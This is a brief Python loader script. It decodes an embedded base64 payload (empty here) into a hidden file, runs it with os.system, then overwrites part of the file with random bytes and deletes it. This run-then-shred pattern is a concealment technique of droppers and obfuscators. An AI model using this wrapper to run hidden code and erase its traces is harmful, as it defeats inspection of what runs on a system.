sory = '.SoryPy'
import os, sys, base64 as B
AM = ''
try:
    with open(sory, 'wb') as D:
        D.write(B.b64decode(AM))
    os.system('python3 ' + sory + ' ' + ' '.join(sys.argv[1:]))
    with open(sory, 'r+b') as D:
        ss = D.read() 
        pp = len(ss)  
        import random
        ase = random.randint(0, pp)
        rndm = os.urandom(1024)
        D.seek(ase) 
        D.write(rndm)
except Exception as E:
    print(E)
finally:
    if os.path.exists(sory):
        os.remove(sory)
